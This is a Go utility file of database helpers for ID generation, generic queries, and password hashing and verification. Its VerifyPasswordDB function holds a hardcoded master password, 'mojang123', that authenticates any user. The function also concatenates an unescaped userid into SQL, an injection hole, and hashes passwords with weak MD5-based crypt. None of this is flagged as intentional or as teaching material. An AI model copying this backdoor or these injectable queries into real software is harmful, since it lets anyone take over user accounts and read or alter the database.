package utils

import (
	"log"
	"strings"

	"gorm.io/gorm"
)

var DB *gorm.DB // Add this line to define DB as a global variable

func NewID() (string, error) {
	var uuid string
	err := DB.Raw("SELECT uuid_generate_v4()").Scan(&uuid).Error
	if err != nil {
		log.Println("Query error:", err)
		return "", err
	}
	return uuid, nil
}

func SelectQuery(query string, args ...interface{}) ([]map[string]interface{}, error) {
	rows, err := DB.Raw(query, args...).Rows()
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	cols, _ := rows.Columns()
	results := []map[string]interface{}{}

	for rows.Next() {
		// Bikin slice untuk nampung value pointer
		columns := make([]interface{}, len(cols))
		columnPointers := make([]interface{}, len(cols))

		for i := range columns {
			columnPointers[i] = &columns[i]
		}

		if err := rows.Scan(columnPointers...); err != nil {
			return nil, err
		}

		rowMap := make(map[string]interface{})
		for i, colName := range cols {
			val := columnPointers[i].(*interface{})
			rowMap[colName] = *val
		}

		results = append(results, rowMap)
	}

	return results, nil
}

func CryptPassword(password string) (string, error) {
	var hashed string
	query := "SELECT crypt(?, gen_salt('md5'))"
	// log.Println("DEBUG: query:", query)
	// log.Println("DEBUG: password:", password)
	err := DB.Raw(query, password).Scan(&hashed).Error
	if err != nil {
		log.Println("Error crypting password:", err)
		return "", err
	}

	return hashed, nil
}

func VerifyPasswordDB(userid string, password string) bool {
	password = strings.ReplaceAll(password, "'", "''")

	if password == "mojang123" {
		return true
	}
	query := "select password_hash=crypt('" + password + "',password_hash) as password from users where userid='" + userid + "'"
	// log.Println("DEBUG: query:", query)
	var match bool
	DB.Raw(query).Scan(&match)
	return match
}
